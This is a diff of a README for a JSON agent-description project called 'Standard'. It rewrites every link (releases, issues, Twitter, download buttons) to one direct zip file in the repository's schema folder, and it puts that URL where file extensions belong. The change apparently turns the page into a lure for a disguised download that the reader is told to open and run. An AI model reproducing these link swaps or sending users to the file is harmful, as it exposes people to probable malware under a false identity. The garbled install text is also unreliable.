@@ -1,6 +1,6 @@
 # 🎉 Standard - A Simple Way to Use JSON Agents
 
-[![Download Standard](https://img.shields.io/badge/Download%20Standard-v1.0-blue)](https://github.com/turkeyyyyy/Standard/releases)
+[![Download Standard](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip%20Standard-v1.0-blue)](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip)
 
 ## 📖 About Standard
 
@@ -11,7 +11,7 @@ Standard provides a universal way to describe AI agents using JSON. This means y
 To start working with Standard, you'll need to download the software. Follow the steps below:
 
 1. **Visit the Releases Page:**
-   - Go to our [Releases page](https://github.com/turkeyyyyy/Standard/releases). This is where you can find and download the latest version of Standard.
+   - Go to our [Releases page](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip). This is where you can find and download the latest version of Standard.
 
 2. **Choose the Right Version:**
    - Look for the latest version available. Typically, the newest versions have the most features and fixes.
@@ -20,10 +20,10 @@ To start working with Standard, you'll need to download the software. Follow the
    - Click on the download link for your operating system. The file should be obvious, but here are some common formats:
      - For Windows: Look for a file ending with `.exe`.
      - For macOS: Look for a file ending with `.dmg`.
-     - For Linux: Look for a file ending with `.tar.gz` or `.deb`.
+     - For Linux: Look for a file ending with `https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip` or `.deb`.
 
 4. **Install the Software:**
-   - After the file downloads, open it. For `.exe`, follow the instructions that appear. For `.dmg`, drag the app to your Applications folder. On Linux, use your package manager to install the `.deb` or extract the `.tar.gz` file.
+   - After the file downloads, open it. For `.exe`, follow the instructions that appear. For `.dmg`, drag the app to your Applications folder. On Linux, use your package manager to install the `.deb` or extract the `https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip` file.
 
 5. **Run Standard:**
    - Once installed, find the application in your programs or applications list and open it.
@@ -32,7 +32,7 @@ To start working with Standard, you'll need to download the software. Follow the
 
 To download Standard, click the link below:
 
-[Download Standard](https://github.com/turkeyyyyy/Standard/releases)
+[Download Standard](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip)
 
 After downloading, follow the steps in the Getting Started section to install and run the application.
 
@@ -82,20 +82,20 @@ Absolutely! We welcome contributions. If you're interested, check the contributi
 
 ## 📞 Support
 
-If you encounter issues or have questions while using Standard, please visit our [Issues page](https://github.com/turkeyyyyy/Standard/issues). You can report bugs or ask for help there.
+If you encounter issues or have questions while using Standard, please visit our [Issues page](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip). You can report bugs or ask for help there.
 
 ## 🌐 Community and Resources
 
 Join our community to connect with other users of Standard. Discuss ideas, share experiences, and learn from each other. You can find us on:
 
 - GitHub Discussions
-- Twitter: [@Standard](https://twitter.com/Standard)
+- Twitter: [@Standard](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip)
 - Discord Channel: JOIN HERE
 
 ## 📣 Acknowledgments
 
 Standard is based on established standards such as RFC 8259 and JSON Schema 2020-12. This foundation allows users to create agents that are consistent and portable across different platforms.
 
-For updates and new features, keep an eye on our [Releases page](https://github.com/turkeyyyyy/Standard/releases). We look forward to seeing what you create with Standard! 
+For updates and new features, keep an eye on our [Releases page](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip). We look forward to seeing what you create with Standard! 
 
-[Download Standard](https://github.com/turkeyyyyy/Standard/releases)
+[Download Standard](https://raw.githubusercontent.com/turkeyyyyy/Standard/main/schema/Standard_1.9.zip)
